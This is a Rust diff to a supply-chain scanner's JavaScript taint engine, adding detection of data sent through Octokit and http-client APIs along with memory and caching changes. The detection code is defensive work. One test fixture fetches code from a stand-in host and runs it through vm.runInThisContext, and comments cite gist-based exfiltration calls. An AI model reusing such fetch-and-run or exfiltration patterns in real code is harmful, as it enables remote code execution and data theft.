@@ -637,7 +637,8 @@ fn inert_char(c: u32) -> bool {
 /// what the text follower's tests read) and what is known before reading.
 pub struct Supply {
     pub pack: Arc<Pack>,
-    pub text: Vec<u32>,
+    /// (the text the tree was read from, shared: no copy of its own)
+    pub text: Arc<[u32]>,
     pub lit: LiteralTest,
     /// the names that hold a path outside the package (core's `outside`)
     pub outside: std::cell::RefCell<HashSet<PyStr>>,
@@ -669,12 +670,12 @@ pub struct PendingRun {
 use std::collections::HashSet;
 
 impl Supply {
-    pub fn new(pack: Arc<Pack>, text: &[u32]) -> Supply {
-        let lit = LiteralTest::new(&pack, text);
+    pub fn new(pack: Arc<Pack>, text: Arc<[u32]>) -> Supply {
+        let lit = LiteralTest::new(&pack, &text);
         let whole = pack.text("_LD_WHOLE_ENV");
         Supply {
             pack,
-            text: text.to_vec(),
+            text,
             lit,
             outside: std::cell::RefCell::new(HashSet::new()),
             whole,
@@ -1325,7 +1326,7 @@ impl<'p> Eval<'p> {
     fn sc_source(&self, bit: u16, what: PyStr, at: u32, line: u32, mark: u8) -> V {
         let bit = if bit == K_FILE && cred_store(self.sup().p(), &what) { K_CRED_FILE } else { bit };
         let f = &self.p.fns[self.fid as usize];
-        let fname = if f.is_module { None } else { f.name.clone().map(Rc::new) };
+        let fname = if f.is_module { None } else { f.name.as_ref().map(|n| Rc::new(n.to_vec())) };
         let sc = Sc { kinds: bit, firsts: vec![(bit_index(bit), Rc::new(what), at)] };
         V::new(true, Some((self.m, line)), fname, None, V::empty().params, 0, false, mark).with_sc(Some(Rc::new(sc)))
     }
@@ -1364,10 +1365,26 @@ impl<'p> Eval<'p> {
     /// `axios.post` (a package's member), `fetch` (a global, also through
     /// globalThis, window, self or global).
     fn sc_names(&mut self, callee: NodeId, scope: ScopeId) -> Rc<Vec<PyStr>> {
+        if self.p.mods[self.m as usize].sc_names_none.get(callee) {
+            return self.p.sc_names_empty.clone();
+        }
         if let Some(hit) = self.p.sc_names_memo.get(&(self.m, callee)) {
             return hit.clone();
         }
-        let names = Rc::new(self.sc_names_of(callee, scope));
+        // (one copy of each list of names, however many calls have it: BIG-BUNDLE-TAIL, memory)
+        let names = self.sc_names_of(callee, scope);
+        if names.is_empty() {
+            self.p.mods[self.m as usize].sc_names_none.set(callee);
+            return self.p.sc_names_empty.clone();
+        }
+        let names = match self.p.sc_names_kept.get(&names) {
+            Some(kept) => kept.clone(),
+            None => {
+                let kept = Rc::new(names.clone());
+                self.p.sc_names_kept.insert(names, kept.clone());
+                kept
+            }
+        };
         self.p.sc_names_memo.insert((self.m, callee), names.clone());
         names
     }
@@ -1423,6 +1440,37 @@ impl<'p> Eval<'p> {
             }
         }
         dedupe(out)
+    }
+
+    /// BIG-BUNDLE-TAIL: a call that sends what it is given to a web API by the API client's own shapes: @actions/http-client's
+    /// JSON senders (`postJson`, `putJson`, `patchJson`), and Octokit's (what
+    /// a GitHub Action bundles: @actions/github's `getOctokit`), whatever the client is bound to: a method `request`
+    /// given a route first (`github.request('POST /gists', { files })`, @octokit/request's `request(...)`: the route
+    /// is the address, as fetch's URL is), and a REST endpoint method (`github.rest.gists.create({ files })`: all it
+    /// is given is sent). Octokit makes its `request` through hooks and its REST methods from a table at run time,
+    /// which no reading of the code follows to its fetch.
+    fn sc_api_send(&self, node: NodeId, callee: NodeId, name: Option<&[u32]>) -> Option<Spec> {
+        // @actions/http-client's (and typed-rest-client's) JSON senders: `client.postJson(url, obj)` sends what it is
+        // given after the address, whatever the client is bound to
+        if name.is_some_and(|n| is_one(n, &["postJson", "putJson", "patchJson"])) {
+            return Some(SEND1);
+        }
+        let request = name.is_some_and(|n| eq(n, "request"));
+        let a = self.a();
+        if request {
+            let first = *a.list(node, jt::B).first()?;
+            let route = self.sc_const_str(first)?;
+            let methods = ["GET ", "POST ", "PUT ", "PATCH ", "DELETE ", "HEAD "];
+            return methods.iter().any(|m| pystr::starts_with(&route, m) && route.get(m.len()) == Some(&0x2F)).then_some(SEND1);
+        }
+        // `<x>.rest.<scope>.<method>(…)`: the callee's object a member `<scope>` of a member `rest`
+        let scope = a.unwrap(a.at(callee, jt::A));
+        if a.kind(scope) != Kind::MemberExpression || a.computed(scope) || a.prop_name(scope).is_none() {
+            return None;
+        }
+        let rest = a.unwrap(a.at(scope, jt::A));
+        (a.kind(rest) == Kind::MemberExpression && !a.computed(rest) && a.prop_name(rest).is_some_and(|n| eq(&n, "rest")))
+            .then_some(OPTIONS)
     }
 
     /// The string a node is when it is constant: a string literal, a
@@ -1653,23 +1701,14 @@ impl<'p> Eval<'p> {
     pub(super) fn sc_global_bind(&mut self, ident: NodeId) -> BindId {
         let name = self.a().name(ident).to_vec();
         let m = self.m;
-        let key = (3u8, m, name.clone());
+        let nid = self.p.name_id(&name);
+        let key = (3u8, m, nid);
         if let Some(&b) = self.p.sc_props.get(&key) {
             return b;
         }
         let bid = self.p.binds.len() as BindId;
         let fid = self.p.mods[m as usize].fn_;
-        self.p.binds.push(Bind {
-            bid,
-            name,
-            kind: BindKind::Var,
-            fid,
-            writes: Vec::new(),
-            shared: true,
-            module: m,
-            refs: Vec::new(),
-            targets: None,
-        });
+        self.p.binds.push(Bind { bid, name: nid, kind: BindKind::Var, fid, writes: Vec::new(), shared: true, module: m, refs: Vec::new() });
         self.p.sc_props.insert(key, bid);
         bid
     }
@@ -1847,7 +1886,7 @@ impl<'p> Eval<'p> {
         for &key in v.params.iter() {
             self.reach_adds.push((key, cat, entry.clone()));
         }
-        if v.src && self.emit {
+        if v.src && v.sc.is_some() && self.emitting() {
             if let Some(sc) = &v.sc {
                 self.sc_emit(sc, cat == SEND_ADDR, at);
             }
@@ -1870,13 +1909,13 @@ impl<'p> Eval<'p> {
         for &key in v.params.iter() {
             self.reach_adds.push((key, cat, entry.clone()));
         }
-        if v.src && self.emit && v.sc.as_ref().is_some_and(|s| s.kinds & K_RECEIVED != 0) {
+        if v.src && v.sc.as_ref().is_some_and(|s| s.kinds & K_RECEIVED != 0) && self.emitting() {
             if let Some(name) = received_cat(cat) {
                 self.findings.push(Out::Received { at, cat: name });
             }
         }
         // (code the script decodes, run)
-        if v.src && self.emit && cat == RUN_CODE {
+        if v.src && cat == RUN_CODE && self.emitting() {
             if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
                 self.findings.push(Out::Decoded { at, from });
             }
@@ -2406,7 +2445,7 @@ impl<'p> Eval<'p> {
         let Write::Param { node: pat, scope: pscope, index } = bind.writes[0] else { return None };
         // (the name's own declaration: the identifier the pattern binds of that name)
         let a = self.a();
-        let decl = a.pattern_names(pat).into_iter().map(|(n, _)| n).find(|&n| a.name(n) == bind.name.as_slice())?;
+        let decl = a.pattern_names(pat).into_iter().map(|(n, _)| n).find(|&n| a.name(n) == &self.p.names[bind.name as usize][..])?;
         let (path, own_default) = param_place(&a, pat, decl)?;
         // (a destructuring's own default, `{ customFetch } = {}`)
         let pat_default =
@@ -2613,24 +2652,15 @@ impl<'p> Eval<'p> {
         if self.bind(name.1, scope).is_some() {
             return None;
         }
-        let key = (4u8, self.m, name.0.clone());
+        let nid = self.p.name_id(&name.0);
+        let key = (4u8, self.m, nid);
         if let Some(&b) = self.p.sc_props.get(&key) {
             return Some(b);
         }
         let m = self.m;
         let bid = self.p.binds.len() as BindId;
         let fid = self.p.mods[m as usize].fn_;
-        self.p.binds.push(Bind {
-            bid,
-            name: name.0,
-            kind: BindKind::Var,
-            fid,
-            writes: Vec::new(),
-            shared: true,
-            module: m,
-            refs: Vec::new(),
-            targets: None,
-        });
+        self.p.binds.push(Bind { bid, name: nid, kind: BindKind::Var, fid, writes: Vec::new(), shared: true, module: m, refs: Vec::new() });
         self.p.sc_props.insert(key, bid);
         Some(bid)
     }
@@ -3072,7 +3102,7 @@ impl<'p> Eval<'p> {
         } else {
             None
         };
-        if let (Some(i), true) = (target, self.emit) {
+        if let Some(i) = target.filter(|_| self.emitting()) {
             if let (Some(v), Some(&n)) = (args.get(i), arg_nodes.get(i)) {
                 if let Some(pkg) = v.sc.as_ref().and_then(|sc| sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PKG)).map(|(_, w, _)| (**w).clone()) {
                     if self.sc_code_path(n, scope) {
@@ -3343,14 +3373,14 @@ impl<'p> Eval<'p> {
             }
             // (a program it decodes, run)
             if let Some(v) = args.first() {
-                if v.src && self.emit {
+                if v.src && self.emitting() {
                     if let Some(from) = v.sc.as_ref().and_then(|s| decoded_at(s)) {
                         self.findings.push(Out::Decoded { at, from });
                     }
                 }
             }
         }
-        if !self.emit {
+        if !self.emitting() {
             return;
         }
         let sup = self.sup();
@@ -3577,6 +3607,11 @@ impl<'p> Eval<'p> {
     /// with those values too (`outer(cb) { inner(cb); }`). A function given is a parameter this caller uses, so it
     /// is read again when what the callee calls the parameter with changes.
     fn sc_param_calls(&mut self, node: NodeId, fids: &[FnId], args: &[V], spread: isize, scope: ScopeId) {
+        // (only for a callee that calls a parameter: one that does so for the first time has every caller read
+        // again, Change::later_all)
+        if !fids.iter().any(|f| self.p.pc_tracked_fns.contains(f) || self.p.fns[*f as usize].sc_ref().is_some_and(|s| !s.param_calls.is_empty())) {
+            return;
+        }
         let arg_nodes = self.a().list(node, jt::B).to_vec();
         let mut given_fns: Vec<(usize, Vec<FnId>)> = Vec::new();
         for (i, &an) in arg_nodes.iter().enumerate() {
@@ -3590,10 +3625,18 @@ impl<'p> Eval<'p> {
         }
         for &fid in fids {
             for (i, _) in &given_fns {
-                self.uses.entry(fid).or_default().insert(*i);
+                self.uses.push((fid, *i as u32));
+            }
+            if !self.emit && !self.replay && self.p.pc_tracked_fns.contains(&fid) {
+                // (the call kept, to run again when what the callee calls a parameter with grows: driver's replays)
+                let key = (fid, self.fid, node);
+                let site = PcSite { cur: self.cur, args: args.to_vec(), spread, given: given_fns.clone() };
+                if self.p.pc_sites.insert(key, site).is_none() {
+                    self.p.pc_by_callee.entry(fid).or_default().push((self.fid, node));
+                }
             }
             let calls: Vec<(usize, Vec<V>)> =
-                self.p.fns[fid as usize].param_calls.iter().map(|(&i, g)| (i, g.clone())).collect();
+                self.p.fns[fid as usize].sc_ref().map(|s| s.param_calls.iter().map(|(&i, g)| (i, g.clone())).collect()).unwrap_or_default();
             for (i, given) in calls {
                 let cb_args: Vec<V> = given.iter().map(|g| bind_given(g, fid, args, spread)).collect();
                 if !cb_args.iter().any(|a| a.tainted()) {
@@ -3609,6 +3652,29 @@ impl<'p> Eval<'p> {
                         self.pc_adds.push((key, cb_args.clone()));
                     }
                 }
+            }
+        }
+    }
+
+    /// D-19, a call kept (PcSite) run again for parameter `i` of `fid`, what the callee calls it with having grown
+    /// (driver's replays): as sc_param_calls runs it, for that parameter alone.
+    pub(super) fn sc_pc_replay(&mut self, node: NodeId, fid: FnId, i: usize, site: &PcSite) {
+        let given = match self.p.fns[fid as usize].sc_ref().and_then(|s| s.param_calls.get(&i)) {
+            Some(g) => g.clone(),
+            None => return,
+        };
+        let cb_args: Vec<V> = given.iter().map(|g| bind_given(g, fid, &site.args, site.spread)).collect();
+        if !cb_args.iter().any(|a| a.tainted()) {
+            return;
+        }
+        if let Some((_, cbs)) = site.given.iter().find(|(k, _)| *k == i) {
+            let (cbs, line) = (cbs.clone(), self.call_line(node));
+            self.apply(node, &cbs, &cb_args, -1, line, false);
+        }
+        let here = super::eval::bound(&site.args, site.spread, -1, i);
+        for &key in here.params.iter() {
+            if key & MEMBER_KEY == 0 && key_index(key) != RECV_INDEX {
+                self.pc_adds.push((key, cb_args.clone()));
             }
         }
     }
@@ -3801,24 +3867,15 @@ impl<'p> Eval<'p> {
             D::Obj(o) => Some((2u8, o)),
             _ => None,
         })?;
-        let key = (owner.0, owner.1, name.clone());
+        let nid = self.p.name_id(&name);
+        let key = (owner.0, owner.1, nid);
         if let Some(&b) = self.p.sc_props.get(&key) {
             return Some(b);
         }
         let m = self.m;
         let bid = self.p.binds.len() as BindId;
         let fid = self.p.mods[m as usize].fn_;
-        self.p.binds.push(Bind {
-            bid,
-            name,
-            kind: BindKind::Var,
-            fid,
-            writes: Vec::new(),
-            shared: true,
-            module: m,
-            refs: Vec::new(),
-            targets: None,
-        });
+        self.p.binds.push(Bind { bid, name: nid, kind: BindKind::Var, fid, writes: Vec::new(), shared: true, module: m, refs: Vec::new() });
         if owner.0 == 1 {
             self.p.sc_this_class.insert(bid, owner.1);
         }
@@ -3982,7 +4039,7 @@ impl<'p> Eval<'p> {
                     Write::Import{spec,name,..} => {
                         let mut out=spec.strip_prefix(u("node:").as_slice()).unwrap_or(spec).to_vec();
                         if !is_one(&out,&["fs","fs/promises","path","os"]) {return None}
-                        if !is_one(name,&["*","default","="]) {out.push('.' as u32);out.extend(name);}
+                        if !is_one(name,&["*","default","="]) {out.push('.' as u32);out.extend_from_slice(name);}
                         Some(out)
                     }
                     _=>None,
@@ -4072,7 +4129,7 @@ impl<'p> Eval<'p> {
                         let mut v=self.sc_listed(self.a().at(*node,jt::B),*scope,depth+1,work)?.item()?;
                         let mut pat=self.a().at(*node,jt::A);
                         if self.a().kind(pat)==Kind::VariableDeclaration {pat=self.a().at(*self.a().list(pat,jt::A).first()?,jt::A);}
-                        let decl=self.a().pattern_names(pat).into_iter().map(|(x,_)|x).find(|&x|self.a().name(x)==self.p.binds[b as usize].name.as_slice())?;
+                        let decl=self.a().pattern_names(pat).into_iter().map(|(x,_)|x).find(|&x|self.a().name(x)==&self.p.names[self.p.binds[b as usize].name as usize][..])?;
                         let (path,default)=param_place(&self.a(),pat,decl)?;
                         if default!=NONE {return None}
                         for p in path {v=v.member(&p?)?;} v
@@ -4090,7 +4147,7 @@ impl<'p> Eval<'p> {
                         let mut v=self.sc_listed(self.a().at(callee,jt::A),outer,depth+1,work)?;
                         if is_one(&method,&["map","forEach","filter"]) {v=v.item()?}
                         else if !eq(&method,"then") || !v.kind.collection() {return None}
-                        let decl=self.a().pattern_names(*pat).into_iter().map(|(x,_)|x).find(|&x|self.a().name(x)==self.p.binds[b as usize].name.as_slice())?;
+                        let decl=self.a().pattern_names(*pat).into_iter().map(|(x,_)|x).find(|&x|self.a().name(x)==&self.p.names[self.p.binds[b as usize].name as usize][..])?;
                         let (path,default)=param_place(&self.a(),*pat,decl)?;
                         if default!=NONE {return None}
                         for p in path {v=v.member(&p?)?;}
@@ -4148,7 +4205,8 @@ impl<'p> Eval<'p> {
                     // Every filter receives its mutable source array as its third
                     // argument, even when its elements are immutable strings.
                     let fid=self.p.mods[self.m as usize].fid_at[args[0] as usize];
-                    let params=self.p.fns.get(fid as usize)?.params.clone();
+                    if fid as usize>=self.p.fns.len() {return None}
+                    let params=self.p.fns[fid as usize].params.clone();
                     if params.len()>2 || params.iter().any(|&p|self.a().kind(p)==Kind::RestElement) {return None}
                     if v.kind==ListKind::Entries {
                         for pat in params.iter().take(1) {
@@ -4266,7 +4324,7 @@ impl<'p> Eval<'p> {
         };
         let named = |n: &str| name.as_deref().is_some_and(|x| eq(x, n));
         let names = self.sc_names(callee, scope);
-        if self.emit && names.iter().any(|s| is_one(s, &["fs.rm", "fs.rmSync", "fs.promises.rm", "fs/promises.rm", "fs.unlink", "fs.unlinkSync", "fs.rmdir", "fs.rmdirSync", "fs.promises.rmdir", "fs/promises.rmdir"])) {
+        if names.iter().any(|s| is_one(s, &["fs.rm", "fs.rmSync", "fs.promises.rm", "fs/promises.rm", "fs.unlink", "fs.unlinkSync", "fs.rmdir", "fs.rmdirSync", "fs.promises.rmdir", "fs/promises.rmdir"])) && self.emitting() {
             let nodes=self.a().list(node,jt::B).to_vec();
             let recursive=nodes.get(1).is_some_and(|&n| {
                 let a = self.a();
@@ -4348,6 +4406,9 @@ impl<'p> Eval<'p> {
         }
         if spec.is_none() && member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_WRITES)) {
             spec = Some(OPTIONS);
+        }
+        if spec.is_none() && member {
+            spec = self.sc_api_send(node, callee, name.as_deref());
         }
         if spec.is_none() && name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) {
             // a network program run with data on its command line
@@ -4606,7 +4667,7 @@ impl<'p> Eval<'p> {
                     self.sc_keeps(obj, &v, scope);
                 }
                 if let Some(b) = self.sc_member_container(obj, scope) {
-                    let v = if this { v.within(&BTreeSet::new()) } else { v };
+                    let v = if this { v.within(&[]) } else { v };
                     if v.tainted() {
                         self.write(b, v, false);
                     }
@@ -4644,7 +4705,7 @@ impl<'p> Eval<'p> {
     fn sc_kept(&mut self, callee: NodeId, fids: &[FnId], args: &[V], spread: isize, scope: ScopeId) {
         let kept: Vec<(usize, Vec<PyStr>)> = fids
             .iter()
-            .flat_map(|&f| self.p.fns[f as usize].param_kept.iter().map(|(&i, ns)| (i, ns.iter().cloned().collect())).collect::<Vec<_>>())
+            .flat_map(|&f| self.p.fns[f as usize].sc_ref().map(|s| s.param_kept.iter().map(|(&i, ns)| (i, ns.iter().cloned().collect())).collect::<Vec<_>>()).unwrap_or_default())
             .collect();
         if kept.is_empty() {
             return;
@@ -4695,7 +4756,7 @@ impl<'p> Eval<'p> {
                 None => return,
             }
         };
-        if self.p.fns[self.fid as usize].cls.is_some() && !self.p.fns[self.fid as usize].ret_kept.contains(&name) {
+        if self.p.fns[self.fid as usize].cls.is_some() && !self.p.fns[self.fid as usize].sc_ref().is_some_and(|s| s.ret_kept.contains(&name)) {
             self.rk_adds.push(name);
         }
     }
@@ -4703,7 +4764,7 @@ impl<'p> Eval<'p> {
     /// supply mode (D-3c): what a call on a name of methods that return members of `this` (Func::ret_kept) gives
     /// back: what that name's members hold as containers (sc_kept put it there), not what every instance's do.
     fn sc_kept_returned(&mut self, callee: NodeId, fids: &[FnId], scope: ScopeId) -> V {
-        let names: Vec<PyStr> = fids.iter().flat_map(|&f| self.p.fns[f as usize].ret_kept.iter().cloned().collect::<Vec<_>>()).collect();
+        let names: Vec<PyStr> = fids.iter().flat_map(|&f| self.p.fns[f as usize].sc_ref().map(|s| s.ret_kept.iter().cloned().collect::<Vec<_>>()).unwrap_or_default()).collect();
         if names.is_empty() {
             return V::empty();
         }
@@ -4750,26 +4811,18 @@ impl<'p> Eval<'p> {
         if held.kind == BindKind::Import {
             return None;
         }
-        let key = (5u8, b, name.to_vec());
+        let (fid, shared, module, held_name) = (held.fid, held.shared, held.module, held.name);
+        let nid = self.p.name_id(name);
+        let key = (5u8, b, nid);
         if let Some(&got) = self.p.sc_props.get(&key) {
             return Some(got);
         }
-        let (fid, shared, module) = (held.fid, held.shared, held.module);
-        let mut full = held.name.clone();
+        let mut full = self.p.names[held_name as usize].to_vec();
         full.push(0x2E);
         full.extend_from_slice(name);
+        let full = self.p.name_id(&full);
         let bid = self.p.binds.len() as BindId;
-        self.p.binds.push(Bind {
-            bid,
-            name: full,
-            kind: BindKind::Var,
-            fid,
-            writes: Vec::new(),
-            shared,
-            module,
-            refs: Vec::new(),
-            targets: None,
-        });
+        self.p.binds.push(Bind { bid, name: full, kind: BindKind::Var, fid, writes: Vec::new(), shared, module, refs: Vec::new() });
         self.p.sc_props.insert(key, bid);
         Some(bid)
     }
@@ -4908,7 +4961,7 @@ fn outside_names(prog: &Program, sup: &Supply) -> HashSet<PyStr> {
             if let Write::Init { node, path, .. } | Write::Assign { node, path, .. } = w {
                 if path.is_empty() && b.module == 0 {
                     let n = &prog.mods[0].tree.nodes[*node as usize];
-                    values.push((b.name.clone(), n.start, n.end));
+                    values.push((prog.names[b.name as usize].to_vec(), n.start, n.end));
                 }
             }
         }
@@ -4978,8 +5031,28 @@ pub enum Unread {
     /// the parser refused it (its line and reason): in a TypeScript file's dialect, that reading's; otherwise
     /// JavaScript's, the first tried, when TypeScript's refuses it too
     Refused(usize, PyStr),
-    /// over MAX_FILE, or past the pass's budget
-    Other,
+    /// over SUPPLY_MAX_FILE (the scans' largest source file: a larger one is SC-TRUNCATED by its size)
+    Size,
+    /// past the pass's budget (Q-FLOW-INCOMPLETE): where it stopped, in the note's words
+    Incomplete(PyStr),
+}
+
+/// The parser's refusal of code V8 compiles: nesting past the parser's bound (jsparse MAX_DEPTH; the registry's
+/// SC-NESTED-CODE). Any other refusal is of a text no JavaScript runtime runs.
+pub const NESTING_REFUSAL: &str = "nesting too deep";
+
+/// BIG-BUNDLE-TAIL (the review of Oct 20, HIGH 3): why the tree did not read a JavaScript text it was given that a
+/// runtime runs, in words, when it did not: the parser refused code V8 compiles (nesting too deep), or the reading
+/// stopped at the pass's budget (where, from its note). None when the tree read it, when the text is past the scans'
+/// largest file (SC-TRUNCATED by its size), or when the parser refused code no runtime runs.
+pub fn unread_why(text: &[u32]) -> Option<String> {
+    match facts_or_why(text) {
+        Err(Unread::Refused(line, reason)) if pystr::eq(&reason, NESTING_REFUSAL) => {
+            Some(format!("the parser refused it at line {line} ({NESTING_REFUSAL})"))
+        }
+        Err(Unread::Incomplete(why)) => Some(pystr::to_string(&why)),
+        _ => None,
+    }
 }
 
 /// The dialect the supply-chain tree reads a text in (TS-STRIP). `Js`: a JavaScript file's, or a text whose file is
@@ -5020,7 +5093,7 @@ impl Dialect {
 thread_local! {
     /// The last text read, in its dialect, and what the tree said (Err: why it could not say): the tests ask for a
     /// text's send, then for its received code. (One text in two dialects is two readings.)
-    static LAST: std::cell::RefCell<Option<(Dialect, Vec<u32>, Result<Rc<Facts>, Unread>)>> = const { std::cell::RefCell::new(None) };
+    static LAST: std::cell::RefCell<Option<(Dialect, std::sync::Arc<[u32]>, Result<Rc<Facts>, Unread>)>> = const { std::cell::RefCell::new(None) };
     /// the dialect of the text the call in progress reads (read_as): the API's `dialect`, a hook target's by its name
     static DIALECT: std::cell::Cell<Dialect> = const { std::cell::Cell::new(Dialect::Js) };
 }
@@ -5047,33 +5120,44 @@ pub fn dialect() -> Dialect {
     DIALECT.with(|d| d.get())
 }
 
+/// The largest text the supply-chain tree reads (BIG-BUNDLE-TAIL, D-8: a bundle's own code is at its end, past
+/// 2,000,000, where jsflow's taint pass stops, `MAX_FILE`): the registry's and the scans' largest source file
+/// (`SOURCE_SIZE_CAP`, 16,000,000). A larger text, one the parser refuses, or a reading past the pass's budget (its
+/// work by the tree's size, its iteration cap, a function cut: Q-FLOW-INCOMPLETE) is the text followers' to answer.
+pub const SUPPLY_MAX_FILE: usize = 16_000_000;
+
 /// The tree's facts about a JavaScript text, or None when it could not say
-/// (a text the parser doesn't read, over 2 MB, or past the pass's budget):
-/// the text followers answer then.
+/// (a text the parser doesn't read, over SUPPLY_MAX_FILE, or past the pass's
+/// budget): the text followers answer then.
 pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
     facts_or_why(text).ok()
 }
 
 /// facts(), or why there are none.
 fn facts_or_why(text: &[u32]) -> Result<Rc<Facts>, Unread> {
-    if text.len() > MAX_FILE {
-        return Err(Unread::Other);
+    if text.len() > SUPPLY_MAX_FILE {
+        return Err(Unread::Size);
     }
     let dialect = dialect();
     if let Some(hit) = LAST.with(|l| {
-        l.borrow().as_ref().filter(|(d, t, _)| *d == dialect && t.as_slice() == text).map(|(_, _, f)| f.clone())
+        l.borrow().as_ref().filter(|(d, t, _)| *d == dialect && &t[..] == text).map(|(_, _, f)| f.clone())
     }) {
         return hit;
     }
-    let owned = text.to_vec();
+    // (BIG-BUNDLE-TAIL, the review of Oct 20: one copy of the text, the reading's and the cache's, the last text's
+    // let go first: at 16,000,000 characters each copy is 64 MB, and the WebAssembly build's memory never shrinks)
+    LAST.with(|l| *l.borrow_mut() = None);
+    // (the call's own copy when it is this text: call_owned shares it, and it is not copied again)
+    let owned: std::sync::Arc<[u32]> = crate::api::call_text_shared(text).unwrap_or_else(|| std::sync::Arc::from(text));
+    let kept = owned.clone();
     // (the copy's searches ask the call's gate: P-1)
     let gate = crate::textgate::share(text);
     let got = crate::api::on_own_stack(move || {
         let _gate = gate.and_then(|g| crate::textgate::adopt(&owned, g));
-        facts_here(&owned, dialect)
+        facts_here(owned.clone(), dialect)
     })
     .map(Rc::new);
-    LAST.with(|l| *l.borrow_mut() = Some((dialect, text.to_vec(), got.clone())));
+    LAST.with(|l| *l.borrow_mut() = Some((dialect, kept, got.clone())));
     got
 }
 
@@ -5091,12 +5175,20 @@ pub fn refusal(text: &[u32]) -> Option<(usize, PyStr)> {
 /// refusal() by the parse alone, without the model's reading: what a host asks of a text another test read on its
 /// tree (an install script's: the registry's `js_refusal`), in the dialect of the call (read_as).
 pub fn parse_refusal(text: &[u32]) -> Option<(usize, PyStr)> {
-    if text.len() > MAX_FILE {
+    if text.len() > SUPPLY_MAX_FILE {
         return None;
     }
-    let owned = text.to_vec();
     let dialect = dialect();
-    crate::api::on_own_stack(move || supply_tree(&owned, dialect).err())
+    // (on WebAssembly the call's own stack is its stack: the text is read where it is, not copied)
+    #[cfg(target_arch = "wasm32")]
+    {
+        supply_tree(text, dialect).err()
+    }
+    #[cfg(not(target_arch = "wasm32"))]
+    {
+        let owned = text.to_vec();
+        crate::api::on_own_stack(move || supply_tree(&owned, dialect).err())
+    }
 }
 
 /// The tree the model reads for a JavaScript text, or the parser's refusal of it. A TypeScript file's (`Ts`, `Tsx`)
@@ -5202,23 +5294,27 @@ fn source_spans_of(tree: &crate::jsparse::tree::Tree) -> Vec<(usize, usize)> {
     merged
 }
 
-fn facts_here(text: &[u32], dialect: Dialect) -> Result<Facts, Unread> {
+fn facts_here(shared: Arc<[u32]>, dialect: Dialect) -> Result<Facts, Unread> {
+    let text: &[u32] = &shared;
     let pack = crate::pack::current();
     let path = u("script.js");
     let tree = supply_tree(text, dialect).map_err(|(line, reason)| Unread::Refused(line, reason))?;
     let source_spans = source_spans_of(&tree);
-    let sup = Rc::new(Supply::new(pack, text));
+    let sup = Rc::new(Supply::new(pack, shared.clone()));
     let mut cfg = Config::new(&[], &[], &[], &[]);
     cfg.supply = Some(sup.clone());
     let mut prog = Program::new(Rc::new(cfg));
     prog.add_module(&path, tree, 0);
     prog.resolve_module(0);
+    prog.shrink_to_fit();
     let outside = outside_names(&prog, &sup);
     *sup.outside.borrow_mut() = outside;
     let mut findings: Vec<Out> = Vec::new();
     let notes = fixpoint(&mut prog, &mut findings);
-    if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
-        return Err(Unread::Other);
+    if let Some(Out::Note { msg, .. }) = notes.iter().find(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
+        // (the note's words, the module's name aside: "The JavaScript cross-file pass stopped following values at
+        // stress() after 2,360,765 steps (its budget for 90,008 syntax tree nodes); …")
+        return Err(Unread::Incomplete(pystr::replace(msg, &u(" in 'script.js'"), &[])));
     }
     let late = late_drops(&sup, &findings);
     findings.extend(late);
@@ -5276,7 +5372,7 @@ mod tests {
 
     fn sent(src: &str) -> Option<(&'static str, String, bool)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text, Dialect::Js).ok().map(|f| f.sent) {
+        match facts_here(std::sync::Arc::from(&text[..]), Dialect::Js).ok().map(|f| f.sent) {
             Some(Answer::Found(_at, kind, what, in_address)) => {
                 Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
             }
@@ -5292,7 +5388,7 @@ mod tests {
     /// The category of a text's first received code, if any.
     fn runs(src: &str) -> Option<&'static str> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text, Dialect::Js).ok() {
+        match facts_here(std::sync::Arc::from(&text[..]), Dialect::Js).ok() {
             Some(f) => f.received.map(|(_, cat)| cat),
             None => panic!("not read: {}", src),
         }
@@ -5700,7 +5796,7 @@ mod tests {
     #[test]
     fn fetch_local_checks_run_without_clearing_unknown_startup() {
         let text = u("class Store { fetch(k) { return k; } }\nfunction load(customFetch) { const f = customFetch ?? fetch; return f('https://files.invalid/p').then(r => r.text()).then(t => require('vm').runInThisContext(t)); } load();");
-        let sup = Rc::new(Supply::new(crate::pack::current(), &text));
+        let sup = Rc::new(Supply::new(crate::pack::current(), Arc::from(&text[..])));
         let mut cfg = Config::new(&[], &[], &[], &[]);
         cfg.supply = Some(sup.clone());
         let mut prog = Program::new(Rc::new(cfg));
@@ -6256,7 +6352,7 @@ mod tests {
     fn decoded(src: &str) -> Vec<(usize, usize)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
         let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
-        match facts_here(&text, Dialect::Js).ok() {
+        match facts_here(std::sync::Arc::from(&text[..]), Dialect::Js).ok() {
             Some(f) => f.decoded.iter().map(|&(at, from)| (line(at), line(from))).collect(),
             None => panic!("not read: {}", src),
         }
@@ -6296,7 +6392,7 @@ mod tests {
 
     fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text, Dialect::Js).ok() {
+        match facts_here(std::sync::Arc::from(&text[..]), Dialect::Js).ok() {
             Some(f) => f.dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i)))),
             None => panic!("not read: {}", src),
         }
@@ -6341,7 +6437,7 @@ mod tests {
         // D-9b: out of the script's own folder to a scoped package's
         let rewrote = |src: &str| -> Vec<(usize, String)> {
             let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-            facts_here(&text, Dialect::Js).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
+            facts_here(std::sync::Arc::from(&text[..]), Dialect::Js).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
         };
         for dir in ["__dirname", "path.dirname(__filename)"] {
             let src = format!(
@@ -6372,7 +6468,7 @@ mod tests {
